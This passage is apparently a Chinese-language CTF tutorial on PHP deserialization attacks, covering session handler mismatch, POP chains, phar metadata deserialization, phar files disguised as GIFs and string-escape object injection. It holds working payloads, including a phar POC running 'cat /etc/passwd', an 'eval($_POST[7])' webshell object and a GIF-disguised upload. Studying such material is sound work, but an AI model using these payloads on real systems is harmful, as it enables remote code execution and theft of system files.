$str = new Hello();
 ?>
```

访问该页面回显以下内容：
实例化对象之后回显`mochu`

`session.php`文件处理器是`php_serialize`，`class.php`文件的处理器是`php`，`session.php`文件的作用是传入可控的`session`值，`class.php`文件的作用是在反序列化开始触发`__wakeup`方法的内容，反序列化结束的时候触发`__destruct()`方法

漏洞利用就是在`session.php`的可控点传入`|`+`序列化字符串`，然后再次访问`class.php`调用`session`值的时候会触发

利用脚本如下：

```php
<?php

class Hello
{
    public $name;

    function __wakeup()
    {
        echo "Who are you?";
    }

    function __destruct()
    {
        echo '<br>' . $this->name;
    }
}

$str = new Hello();
$str->name = "m0c1nu7";
echo serialize($str);
```

传入`session.php`的payload：`|O:5:"Hello":1:{s:4:"name";s:7:"m0c1nu7";}`

查看存储的`session`

```php
a:1:{s:7:"session";s:42:"|O:5:"Hello":1:{s:4:"name";s:7:"m0c1nu7";}";}
```

然后再次访问`class.php`

如果程序中设置了不同的`session`序列化引擎，通过控制`session`传入点，攻击者可以把构造好的序列化字符串拼接进`session`存储文件中，当再次调用`session`时触发并反序列化导致形成漏洞

### session反序列化练习

题目:http://web.jarvisoj.com:32784/index.php

```php
<?php
//A webshell is wait for you
ini_set('session.serialize_handler', 'php');
session_start();
class OowoO
{
    public $mdzz;
    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }

    function __destruct()
    {
        eval($this->mdzz);
    }
}
if(isset($_GET['phpinfo']))
{
    $m = new OowoO();
}
else
{
    highlight_string(file_get_contents('sessiontest.php'));
}
?>
```

先看一下`phpinfo()`的信息，先查看一下`session.serialize_handler`

| session.serialize_handler | php  | php_serialize |
| ------------------------- | ---- | ------------- |

`php.ini`中使用的引擎是`php_serialize`，而程序中使用的引擎是`php`，这就导致`session`在`序列化`和`反序列化`使用的引擎不同，接下来来看看这个选项

| session.upload_progress.enabled | On   | On   |
| ------------------------------- | ---- | ---- |

>PHP手册
>
>Session 上传进度
>
>当 `session.upload_progress.enabled` INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态
>
>当一个上传在处理中，同时POST一个与INI中设置的`session.upload_progress.name`同名变量时，上传进度可以在`$_SESSION`中获得。当PHP检测到这种POST请求时，它会在`$_SESSION`中添加一组数据, 索引是 `session.upload_progress.prefix` 与 `session.upload_progress.name`连接在一起的值

构造`POST`表单，提交传入序列化字符串

```html
<form action="http://web.jarvisoj.com:32784/index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="m0c1nu7" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```

构造利用脚本

```php
<?php
class OowoO
{
    public $mdzz='echo(dirname(__FILE__));';
}
$obj = new OowoO();
$a = serialize($obj);
echo $a;
?>
```

序列化结果:

```php
O:5:"OowoO":1:{s:4:"mdzz";s:24:"echo(dirname(__FILE__));";}
```

抓包，传值:

```php
|O:5:"OowoO":1:{s:4:"mdzz";s:10:"echo(111);";}
```

例题:

```php
<?php
//test.php
highlight_string(file_get_contents(basename($_SERVER['PHP_SELF'])));
//show_source(__FILE__);

class foo1{
        public $varr;
        function __construct(){
                $this->varr = "index.php";
        }
        function __destruct(){
                if(file_exists($this->varr)){
                        echo "<br>文件".$this->varr."存在<br>";
                }
                echo "<br>这是foo1的析构函数<br>";
        }
}

class foo2{
        public $varr;
        public $obj;
        function __construct(){
                $this->varr = '1234567890';
                $this->obj = null;
        }
        function __toString(){
                $this->obj->execute();
                return $this->varr;
        }
        function __destruct(){
                echo "<br>这是foo2的析构函数<br>";
        }
}

class foo3{
        public $varr;
        function execute(){
                eval($this->varr);
        }
        function __destruct(){
                echo "<br>这是foo3的析构函数<br>";
        }
}
?>
```

首先来分析一下代码把，目标是调用`foo3::execute()`，然后在`foo2::__toString()`中调用了`execute()`，那就把`foo3`的类对象赋值给`foo2:$obj`，然后再看一下哪里触发了`__toString()`，可以发现在`foo1:__destruct()`有使用`echo`将对象输出为字符的操作，这里会触发`__toString()`，把`foo2`类对象赋值给`foo1:$varr`

```
POP链为：fo1::__destruct()->foo2::__toString()->foo3::execute()
```

```php
<?php
class foo3{
        public $varr='echo "spoock";';
        function execute(){
                eval($this->varr);
        }
}
class foo2{
        public $varr;
        public $obj;
        function __construct(){
                $this->varr = '1234567890';
                $this->obj = new foo3();
        }
        function __toString(){
                $this->obj->execute();
                return $this->varr;
        }
}

class foo1{
        public $varr;
        function __construct(){
                $this->varr = new foo2();
        }
}

$obj = new foo1();
print_r(serialize($obj));
?>
```

```php
O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:10:"1234567890";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:14:"echo "spoock";";}}}
```

写入方式主要是利用PHP中`Session Upload Progress`来进行设置，提交一个名为`PHP_SESSION_UPLOAD_PROGRESS`的变量，就可以将`filename`的值赋到`session`中

```html
<form action="index.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="m0c1nu7" />
    <input type="file" name="file" />
    <input type="submit" />
</form>
```

抓包修改`filename`即可，注意在开头添加符号`|`以及双引号转义，最终payload:

```php
|O:4:\"foo1\":1:{s:4:\"varr\";O:4:\"foo2\":2:{s:4:\"varr\";s:10:\"1234567890\";s:3:\"obj\";O:4:\"foo3\":1:{s:4:\"varr\";s:14:\"echo \"spoock\";\";}}}
```

# Phar反序列化漏洞

## 什么是Phar?

>Phar：Php archive
>Phar（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源捆绑到一个归档文件中来实现应用程序和库的分发，类似于JAVA JAR的一种打包文件，自`PHP 5.3.0`起，PHP默认开启对后缀为`.phar`的文件的支持

>官方解释（译文）：
>`phar`扩展提供了一种将整个PHP应用程序放入称为`phar(php归档文件)`的单个文件中的方法，以便于分发和安装。除了提供此服务之外，`phar`扩展还提供了一种文件格式抽象方法，用于通过`PharData`类创建和处理`tar`和`zip`文件
>
>`Phar`存档最有特色的特点是它是将多个文件分组为一个文件的便捷方法。这样，`phar`存档提供了一种将完整的`PHP`应用程序分发到单个文件中并从该文件运行它的方法，而无需将其提取到磁盘中，此外PHP可以像在命令行上和从web服务器上的任何其他文件一样轻松地执行phar存档。`Phar`有点像PHP应用程序的拇指驱动器

`Phar`文件缺省状态是只读的，使用`Phar`文件不需要任何的配置。部署非常方便。因为我们现在需要创建一个自己的`Phar`文件，所以需要允许写入`Phar`文件，这需要修改一下`php.ini`，在`php.ini`文件末尾添加下面这段即可

```php
php.ini中设置为phar.readonly=Off
php version>=5.3.0
```

## Phar文件结构

**a stub**

存根，也可以理解为Phar文件的标识，要求`phar`文件必须以`__HALT_COMPILER();?>`结尾，否则无法被`phar扩展`识别为`phar`文件

**a mainifest describing the contents**

前面提到过，`phar`是一种压缩打包的文件格式，这部分用来存储压缩文件的权限、属性等信息，并且以`序列化`格式存储用户自定义的`meta-data`，这里也是反序列化攻击利用的核心

**the file contents**

这部分是压缩文件具体内容

**[optional] a signature for verifying Phar integrity (phar file format only)**

phar文件格式签名，放在文件末尾

## Phar如何扩展攻击面进行漏洞利用的

phar在压缩文件包时，会以序列化的形式存储用户自定义的`meta-data`，配合`phar://`就能一些函数等参数可控的情况下实现自动反序列化操作，于是攻击者就可以精心构造`phar`包在没有`unserialize()`的情况下实现自动反序列化攻击，从而很大的拓展了反序列化漏洞的攻击面

**受影响的函数:**

> fileatime	filectime	file_exists	file_get_contents
> file_put_contents	file	filegroup	fopen
> fileinode	filemtime	fileowner	fikeperms
> is_dir	is_executable	is_file	is_link
> is_readable	is_writable	is_writeable	parse_ini_file
> copy	unlink	stat	readfile

## demo测试

如何创建一个合法的phar压缩文件

```php
<?php 
class TestObject{
}

@unlink("test.phar");
$phar = new Phar("test.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("__HALT_COMPILER(); ?>");//设置stub
$o=new TestObject();
$phar->setMetadata($o);//将自定义的meta-data存入manifest
$phar->addFromString("test.txt","m0c1nu7 is the best");//添加要压缩的文件及文件内容
//签名自动计算

$phar->stopBuffering();
 ?>
```

接下来构造利用脚本，`php`通过用户定义和内置的`流包装器`实现复杂的文件处理功能。内置包装器可用于文件系统函数，如`fopen()`，`file_get_contents()`，`copy()`，`file_exists()`和`filesize()`。 `phar://`就是一种内置的流包装器

php常见流包装器：

```php
file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器
http:// — 访问 HTTP(s) 网址
ftp:// — 访问 FTP(s) URLs
php:// — 访问各个输入/输出流（I/O streams）
zlib:// — 压缩流
data:// — 数据（RFC 2397）
glob:// — 查找匹配的文件路径模式
phar:// — PHP 归档
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — 音频流
expect:// — 处理交互式的流
```

```php
<?php 
class TestObject{
	public function __destruct(){
		echo "Nice! Destruct Called";
	}
}
$filename = 'phar://test.phar/test.txt';
file_get_contents($filename);
 ?>
```

输出:

```php
m0c1nu7 is the best
```

### 例题：

```php
<?php 
if(isset($_GET['filename'])){
        $filename=$_GET['filename'];
        class MyClass{
                var $output="echo 'Try again';";
                function __destruct(){
                        eval($this->output);
                }
        }
        file_exists($filename);
}else{
        highlight_file(__FILE__);
}
 ?>
```

没有反序列化函数，用常规思路根本做不了，利用phar反序列化，构造脚本

```php
<?php 
class MyClass{
        var $output = 'eval($_POST[7]);';
}

$o = new MyClass();
$filename = 'poc.phar';
file_exists($filename)?unlink($filename) : null;
$phar = new Phar($filename);
$phar->startBuffering();
$phar->setStub("__HALT_COMPILER(); ?>");
$phar->setMetadata($o);
$phar->addFromString('test.txt','m0c1nu7');
$phar->stopBuffering();
 ?>
```

### 例题:

```php
<?php
highlight_file(__FILE__);
class A { 
  protected $b = false; 
  protected $a = 'whoami'; 
  public function __destruct () { 
    if ($this->b) {
      system($this->a);
    }
  }
}
$hello = base64_encode('hello');
if (isset($_GET['hello'])) exit;
parse_str($_REQUEST['world']);
if (!$a) {
  header('Location: ?world=a=hello.txt');
}
$s = base64_decode($hello);
file_put_contents('hello.txt', $s);
echo base64_encode(file_get_contents($a));
?>
```

- 反序列化控制`$this->b`和`$this->a`
- `parse_str()`未设置存储变量的数组，可造成变量覆盖即可控制`$a`和`$hello`
- `file_get_contents($a)`可触发`phar`包中的`meta-data`自动反序列化

POC

```php
<?php
class A {
    protected $b = true;
    protected $a = 'cat /etc/passwd';
    public function __destruct () {
        if ($this->b) {
            system($this->a);
        }
    }
}
$o = new A();
$filename = 'poc.phar';
file_exists($filename)?unlink($filename) : null;
$phar = new Phar($filename);
$phar->startBuffering();
$phar->setStub("__HALT_COMPILER(); ?>");
$phar->setMetadata($o);
$phar->addFromString('test.txt','mochu7');
$phar->stopBuffering();

echo urlencode(urlencode(base64_encode(file_get_contents("poc.phar"))));
 ?>
```

```php
/?world=a=phar://./hello.txt%26hello=X19IQUxUX0NPTVBJTEVSKCk7ID8%252BDQpzAAAAAQAAABEAAAABAAAAAAA9AAAATzoxOiJBIjoyOntzOjQ6IgAqAGIiO2I6MTtzOjQ6IgAqAGEiO3M6MTU6ImNhdCAvZXRjL3Bhc3N3ZCI7fQgAAAB0ZXN0LnR4dAYAAAB91GdhBgAAAHK3aJu2AQAAAAAAAG1vY2h1N9VfplChrvATVfgv5qmQqA48qAw2AgAAAEdCTUI%253D
```

### 例题:

upload.php

```php
<!DOCTYPE html>
<html>
<head>
    <title>文件上传</title>
</head>
<body>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="pic"/>
    <input type="submit" value="上传"/>
</body>
</html>
<?php
header("Content-type:text/html;charset=utf-8");
$ext_arr = array('.jpg', '.png', '.gif');
if (empty($_FILES)) {
    echo "请上传文件";
} else {
    define("PATH", dirname(__DIR__));
    $path = PATH . "/" . "upload" . "/" . "images";
    $filetype = strrchr($_FILES["pic"]["name"], ".");
    if (in_array($filetype, $ext_arr)) {
        move_uploaded_file($_FILES["pic"]["tmp_name"], $path . "/" . $_FILES["pic"]["name"]);
        echo "上传成功！";
    } else {
        echo "只允许上传.jpg|.png|.gif类型文件！";
    }

}
?>
```

file_exists.php
验证文件是否存在，漏洞利用点:`file_exists()`函数

```php
<?php
$filename = $_GET['filename'];

class ghtwf01
{
    public $a = 'echo exists;';

    function __destruct()
    {
        eval($this->a);
    }
}

file_exists($filename);
```

构造phar文件

```php
<?php
class ghtwf01{
    public $a = 'phpinfo();';
    function __destruct()
    {
        eval($this -> a);
    }
}
$phar = new Phar('phar.phar');
$phar -> stopBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar -> addFromString('test.txt','test');
$object = new ghtwf01();
$phar -> setMetadata($object);
$phar -> stopBuffering();
?>
```

改名为phar.gif，上传，利用file_exists.php文件去 包含这个gif文件

```php
?filename=phar://../upload/images/phar.gif
```

## 将phar伪造成其他格式的文件

在前面分析`phar`的文件结构时可能会注意到，`php`识别`phar`文件是通过其文件头的`stub`，更确切一点来说是`__HALT_COMPILER();?>`这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将`phar`文件伪装成其他格式的文件

```php
<?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

# 反序列化字符串溢出(字符串逃逸)

反序列化字符串溢出造成的攻击问题一般是因为对序列化之后的字符串进行了字符替换或者过滤等造成前后字符长度有差异；攻击者可以通过可控的属性传入payload造成对象注入；

- 对象的属性值可控
- 对序列化之后的字符串进行替换或者过滤造成前后长度有差异

例题:

```php
<?php
show_source("index.php");
error_reporting(0);
function filter($str){
    return preg_replace( '/abc|zxhh/','', $str);
}
$login['name'] = $_GET['name'];
$login['pwd'] = $_GET['pwd']; 
$login['money'] = '999';
$new = filter(serialize($login));
printf($new."</br>");
$last = unserialize($new);
var_dump($last);
if($last['money']<1000){
    echo "You need more money";
}else{
    echo file_get_contents('flag.php');
}
?>
```

`$login['name']`和`$login['pwd']`可控，序列化字符串如果出现`abc`或者`zxhh`就被替换为空，题目的意思也很明显，让我们重置`$login['money']`的值；

```php
?name=morningstar&pwd=123456
a:3:{s:4:"name";s:11:"morningstar";s:3:"pwd";s:6:"123456";s:5:"money";s:3:"999";}
```

首先我们需要明确注入的对象为：`";s:5:"money";s:4:"1000";}`
`";`是用于闭合上一个属性

```php
?name=&pwd=";s:5:"money";s:3:"999";}
a:3:{s:4:"name";s:0:"";s:3:"pwd";s:25:"";s:5:"money";s:3:"999";}";s:5:"money";s:3:"999";}
```

如果我们在`name`的值的位置输入若干个`abc`或`zxhh`，通过控制其数量，我们就可以构造字符串溢出使得`name`的值为：`";s:3:"pwd";s:26:"`，长度为`18`；这样的话，后面我们传入的`";s:5:"money";s:4:"1000";}`即可成功被反序列化

```php
?name=abcabcabcabcabcabc&pwd=";s:5:"money";s:4:"1000";s:1:"a";N;}
```

`s:1:"a";N;`是用来补充被吃掉的属性个数的，吃掉了`login["pwd"]`属性，就补充一个任意属性，使得`3`个属性的个数不会错
